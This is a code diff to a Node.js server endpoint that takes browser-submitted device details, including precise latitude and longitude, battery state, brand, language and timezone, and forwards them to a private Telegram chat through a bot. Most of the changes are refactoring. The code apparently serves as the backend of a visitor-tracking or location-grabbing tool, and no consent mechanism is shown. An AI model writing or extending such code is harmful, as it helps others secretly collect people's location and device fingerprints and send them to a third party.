@@ -70,53 +70,42 @@ app.post("/send-to-telegram", async (req, res) => {
     const {
       userAgent, browserName, platform, language, timezone,
       screenWidth, screenHeight, effectiveType, downlink,
-      latitude, longitude, mapLink
+      latitude, longitude, mapLink,
+      brand,          // added
+      batteryLevel,   // added
+      isCharging      // added
     } = req.body;
 
-function detectDevice(userAgent) {
-  const ua = userAgent.toLowerCase();
+    function detectDevice(userAgent) {
+      const ua = userAgent.toLowerCase();
 
-  // Detect OS/platform
-  let platform = "Unknown";
-  if (/android/.test(ua)) platform = "Android";
-  else if (/iphone|ipad|ipod/.test(ua)) platform = "iOS";
-  else if (/windows phone/.test(ua)) platform = "Windows Phone";
-  else if (/windows/.test(ua)) platform = "Windows";
-  else if (/macintosh|mac os x/.test(ua)) platform = "Mac OS";
-  else if (/linux/.test(ua)) platform = "Linux";
+      // Detect OS/platform
+      let detectedPlatform = "Unknown";
+      if (/android/.test(ua)) detectedPlatform = "Android";
+      else if (/iphone|ipad|ipod/.test(ua)) detectedPlatform = "iOS";
+      else if (/windows phone/.test(ua)) detectedPlatform = "Windows Phone";
+      else if (/windows/.test(ua)) detectedPlatform = "Windows";
+      else if (/macintosh|mac os x/.test(ua)) detectedPlatform = "Mac OS";
+      else if (/linux/.test(ua)) detectedPlatform = "Linux";
 
-  // Detect device type
-  let deviceType = "Desktop";
-  if (/mobile/.test(ua)) deviceType = "Smartphone";
-  else if (/tablet|ipad/.test(ua)) deviceType = "Tablet";
+      // Detect device type
+      let deviceType = "Desktop";
+      if (/mobile/.test(ua)) deviceType = "Smartphone";
+      else if (/tablet|ipad/.test(ua)) deviceType = "Tablet";
 
-  return { platform, deviceType };
-}
-
-    function getFriendlyPlatform(userAgent, platform) {
-  const ua = userAgent.toLowerCase();
-
-  if (/android/.test(ua)) return "Android";
-  if (/iphone|ipad|ipod/.test(ua)) return "iOS";
-  if (/windows phone/.test(ua)) return "Windows Phone";
-  if (/windows/.test(ua)) return "Windows";
-  if (/macintosh|mac os x/.test(ua)) return "Mac OS";
-  if (/linux/.test(ua)) return "Linux";
-
-  // fallback to whatever navigator.platform gave
-  return platform || "Unknown";
-}
+      return { platform: detectedPlatform, deviceType };
+    }
 
     const { platform: friendlyPlatform, deviceType } = detectDevice(userAgent);
 
-const message = `
+    const message = `
 📋 *Device Info:*
 🤖 *User Agent:* ${escapeMarkdownV2(userAgent)}
 🌐 *Browser:* ${escapeMarkdownV2(browserName)}
-🖥️ *Platform:* ${escapeMarkdownV2(platform)}
-📱 *Brand:* ${escapeMarkdownV2(brand)}
+🖥️ *Platform:* ${escapeMarkdownV2(friendlyPlatform)}
+📱 *Brand:* ${escapeMarkdownV2(brand || "Unknown")}
 📱 *Device Type:* ${escapeMarkdownV2(deviceType)}
-🔋 *Battery Level:* ${escapeMarkdownV2(batteryLevel + "%")}
+🔋 *Battery Level:* ${escapeMarkdownV2(batteryLevel ? batteryLevel + "%" : "Unknown")}
 🔌 *Charging:* ${escapeMarkdownV2(isCharging ? "Yes" : "No")}
 🗣️ *Language:* ${escapeMarkdownV2(language)}
 ⏰ *Timezone:* ${escapeMarkdownV2(timezone)}
@@ -129,19 +118,18 @@ const message = `
 🕒 *Timestamp:* ${escapeMarkdownV2(new Date().toLocaleString())}
 `;
 
-
     const telegramRes = await fetch(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-     {
-       method: "POST",
-       headers: { "Content-Type": "application/json" },
-       body: JSON.stringify({
-         chat_id: TELEGRAM_CHAT_ID,
-         text: message,
-         parse_mode: "MarkdownV2"
-      })
-  }
-);
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "MarkdownV2"
+        })
+      }
+    );
 
     if (telegramRes.ok) {
       res.json({ success: true });
